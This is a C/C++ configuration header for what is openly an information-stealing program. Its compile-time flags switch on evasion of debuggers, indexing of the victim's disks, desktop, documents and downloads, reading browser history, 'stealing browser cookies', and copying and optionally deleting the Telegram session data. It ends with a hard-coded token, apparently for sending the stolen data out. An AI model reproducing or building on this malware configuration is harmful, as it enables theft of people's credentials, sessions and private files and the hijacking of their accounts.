#pragma once

#define PROCESSCHECK     false // Checks and exit if count of processes greater than 1. For enable replace false to true
#define DEBUGGERPROTECT  true  // Checks and exit if debugger enabled. For disable replace true to false
#define DELETEEXE        false // Delete exe files when steal data. For disable replace true to false
#define PINGREQUIRED     true  // Pings and exit if no internet. For disable replace true to false
#define ISDEBUG          false // Enable debug mode. If this program is final result, here must be false.
#define ADVANCEDDEBUG    false // Displays advanced debug info if debug mode is enabled. For enable replace false to true
#define LOGGING          false // Enable logging work. For enable replace false to true
#define INDEXDISKS       true  // Enable indexing disks. For disable replace true to false
#define INDEXPC          true  // Enable indexing PC info. For disable replace true to false
#define INDEXDOWNLOADS   true  // Enable indexing downloaded files. For disable replace true to false
#define INDEXDESKTOP     true  // Enable indexing desktop files. For disable replace true to false
#define INDEXDOCUMENTS   true  // Enable indexing documents files. For disable replace true to false
#define CLOSECHROME      true  // Enable closing browser. Usually its not needed, but if browser data isn't readable or copyable its must be true
#define INDEXHISTORY     true  // Enable indexing browser history. For disable replace true to false
#define STEALCOOKIE      true  // Enable stealing browser cookies. For disable replace true to false
#define PRINTHISTORY     false // Enable printing browser history. For enable replace false to true
#define COPYTDATA        true  // Enable copy telegram session. For disable replace true to false
#define DELORIGTDATA     false // Enable delete original telegram session. For disable replace true to false

#define TOKEN "012b2f9005594f9ad771b988b7437d7d" // Token